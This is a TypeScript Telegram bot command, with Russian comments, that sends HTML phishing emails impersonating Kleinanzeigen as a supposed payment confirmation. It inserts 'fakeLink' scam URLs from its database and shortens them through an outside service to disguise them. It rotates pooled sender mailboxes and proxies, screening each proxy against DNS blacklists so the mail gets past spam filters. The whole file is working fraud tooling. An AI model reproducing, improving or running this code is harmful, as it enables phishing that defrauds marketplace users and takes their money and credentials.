import { Command } from "@grammyjs/commands";
import type { CustomContext } from "../types";
import { sendEmail } from "../utils/sendEmail";
import { EmailRepo, ProxyRepo, AdvertsRepo } from "../db/queries";
import { toProxyAuth } from "../utils/proxyForm";
import { checkProxyBlacklist } from "../utils/blacklistChecker";

// Функция для сокращения URL через rxmivato.com API
async function shortenUrl(longUrl: string): Promise<string> {
  try {
    const response = await fetch('http://rxmivato.com/api/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ url: longUrl })
    });
    
    if (response.ok) {
      const data = await response.json();
      return data.short_url;
    }
  } catch (err) {
    console.error(`[SHORTENER] Ошибка сокращения:`, err);
  }
  return longUrl;
}

const testhtmlCommand = new Command(
  "testhtml",
  "Отправить HTML шаблон. Пример: /testhtml your@email.com go",
  async (ctx) => {
    try {
      // Получаем аргументы: email и тип шаблона
      const args = ctx.message?.text?.split(" ").slice(1) || [];
      const targetEmail = args[0];
      const htmlType = args[1] || "go";

      if (!targetEmail || !targetEmail.includes("@")) {
        await ctx.reply(
          "❌ Укажите email и тип шаблона.\n\n" +
          "Пример: /testhtml your@email.com go\n\n" +
          "Доступные шаблоны: back, go, push, sms"
        );
        return;
      }

      const validHtmlTypes = ["back", "go", "push", "sms"];
      if (!validHtmlTypes.includes(htmlType)) {
        await ctx.reply(
          `❌ Неверный тип шаблона: ${htmlType}\n\n` +
          `Доступные: ${validHtmlTypes.join(", ")}`
        );
        return;
      }

      await ctx.reply(`🔄 Подготовка отправки HTML шаблона "${htmlType}"...`);

      // 1. Получаем email отправителя
      const senderEmail = await EmailRepo.nextValidEmail(ctx.from!.id);
      if (!senderEmail) {
        await ctx.reply("❌ Нет доступных e-mail отправителей");
        return;
      }

      // 2. Получаем прокси и проверяем на blacklist
      let proxy = await ProxyRepo.nextValidProxy(ctx.from!.id);
      if (!proxy) {
        await ctx.reply("❌ Нет валидных прокси");
        return;
      }
      
      // Извлекаем IP из прокси (формат: login:pass@ip:port или ip:port)
      const proxyParts = proxy.proxy.split('@');
      const ipPort = proxyParts.length > 1 ? proxyParts[1] : proxyParts[0];
      const proxyIp = ipPort.split(':')[0];
      
      await ctx.reply(`🔍 Проверяю прокси ${proxyIp} в 50+ блэклистах...`);
      
      // Проверяем через API dnsbl.smtp.bz
      const blacklistCheck = await checkProxyBlacklist(proxyIp);
      
      if (blacklistCheck.listed) {
        await ctx.reply(
          `⚠️ Прокси ${proxyIp} в blacklist!\n` +
          `📊 Проверено: ${blacklistCheck.totalChecked} блэклистов\n` +
          `❌ Найден в: ${blacklistCheck.blacklists.slice(0, 5).join(', ')}${blacklistCheck.blacklists.length > 5 ? '...' : ''}\n` +
          `Пытаюсь найти чистый прокси...`
        );
        
        // Пробуем найти другой прокси (максимум 5 попыток)
        let foundClean = false;
        for (let i = 0; i < 5; i++) {
          const nextProxy = await ProxyRepo.nextValidProxy(ctx.from!.id);
          if (!nextProxy) break;
          
          const nextIpPort = nextProxy.proxy.split('@').pop() || nextProxy.proxy;
          const nextIp = nextIpPort.split(':')[0];
          
          const nextCheck = await checkProxyBlacklist(nextIp);
          if (!nextCheck.listed) {
            proxy = nextProxy;
            foundClean = true;
            await ctx.reply(`✅ Найден чистый прокси: ${nextIp} (проверено ${nextCheck.totalChecked} блэклистов)`);
            break;
          }
        }
        
        if (!foundClean) {
          await ctx.reply(`⚠️ Не найдено чистых прокси, использую ${proxyIp} (может попасть в спам)`);
        }
      } else {
        await ctx.reply(`✅ Прокси ${proxyIp} чистый (не в blacklist)`);
      }
      
      const proxyUrl = toProxyAuth(proxy.proxy);

      // 3. Парсим логин и пароль
      const colonIndex = senderEmail.email.indexOf(":");
      if (colonIndex === -1) {
        await ctx.reply("❌ Неверный формат email (должен быть email:password)");
        return;
      }

      const login = senderEmail.email.substring(0, colonIndex);
      const appPassword = senderEmail.email.substring(colonIndex + 1);

      // 4. Читаем HTML шаблон
      const templatePath = `./src/templates/${htmlType}.html`;
      let htmlContent: string;
      
      try {
        const templateFile = Bun.file(templatePath);
        htmlContent = await templateFile.text();
      } catch (error) {
        await ctx.reply(`❌ Не удалось загрузить шаблон: ${htmlType}.html`);
        return;
      }

      // 5. Получаем случайную реальную ссылку из БД
      // Используем прямой запрос для получения объявлений с fakeLink
      const { db } = await import("../db/index");
      const { adverts, users } = await import("../db/schema");
      const { eq, and, isNotNull } = await import("drizzle-orm");
      
      // Получаем userId
      const userRow = await db
        .select({ id: users.id })
        .from(users)
        .where(eq(users.telegramId, ctx.from!.id))
        .get();
      
      let testLink = "http://rxmivato.com/TEST123"; // fallback
      
      if (userRow) {
        // Получаем объявления с fakeLink
        const advertsWithLinks = await db
          .select({ fakeLink: adverts.fakeLink })
          .from(adverts)
          .where(and(
            eq(adverts.userId, userRow.id),
            isNotNull(adverts.fakeLink)
          ))
          .all();
        
        if (advertsWithLinks.length > 0) {
          // Берем случайную ссылку
          const randomLink = advertsWithLinks[Math.floor(Math.random() * advertsWithLinks.length)];
          if (randomLink.fakeLink) {
            await ctx.reply("🔗 Сокращаю ссылку через rxmivato.com...");
            testLink = await shortenUrl(randomLink.fakeLink);
          }
        }
      }

      htmlContent = htmlContent.replace(/ADVERT_LINK/g, testLink);

      await ctx.reply(
        `📧 Отправляю HTML письмо:\n\n` +
        `📤 От: <code>${login}</code> (Kleinanzeigen Team)\n` +
        `📥 Кому: <code>${targetEmail}</code>\n` +
        `📝 Шаблон: ${htmlType}\n` +
        `🔗 Тестовая ссылка: ${testLink}\n` +
        `🌐 Прокси: ${proxy.proxy.split(':')[0]}`,
        { parse_mode: "HTML" }
      );

      // 6. Отправляем HTML письмо с retry и сменой прокси
      let result;
      let attempt = 0;
      const maxAttempts = 3;
      let currentProxy = proxy;
      let currentProxyUrl = proxyUrl;
      
      while (attempt < maxAttempts) {
        attempt++;
        
        if (attempt > 1) {
          await ctx.reply(`🔄 Попытка ${attempt}/${maxAttempts}...`);
          
          // При повторной попытке берем новый прокси
          const newProxy = await ProxyRepo.nextValidProxy(ctx.from!.id);
          if (newProxy && newProxy.id !== currentProxy.id) {
            currentProxy = newProxy;
            currentProxyUrl = toProxyAuth(currentProxy.proxy);
            await ctx.reply(`🔄 Переключаюсь на новый прокси: ${currentProxy.proxy.split('@')[1].split(':')[0]}`);
          }
        }
        
        result = await sendEmail({
          login,
          appPassword,
          to: targetEmail,
          subject: "Kleinanzeigen-Zahlung abgeschlossen",
          html: htmlContent,
          displayName: "Kleinanzeigen Team",
          proxy: currentProxyUrl,
          enableLogging: true,
        });
        
        if (result.success) {
          break;
        }
        
        // Если не последняя попытка, небольшая пауза
        if (attempt < maxAttempts) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      if (result.success) {
        await ctx.reply(
          `✅ HTML письмо успешно отправлено!\n\n` +
          `📊 Информация:\n` +
          `  • Message ID: ${result.messageId}\n` +
          `  • От: ${login}\n` +
          `  • Кому: ${targetEmail}\n` +
          `  • Шаблон: ${htmlType}\n` +
          `  • Попыток: ${attempt}\n\n` +
          `Проверьте почту (может попасть в спам)`
        );
      } else {
        await ctx.reply(
          `❌ Ошибка отправки после ${maxAttempts} попыток:\n${result.error || "Unknown error"}`
        );
      }

    } catch (error) {
      await ctx.reply(`❌ Ошибка: ${error instanceof Error ? error.message : String(error)}`);
    }
  }
);

export default testhtmlCommand;
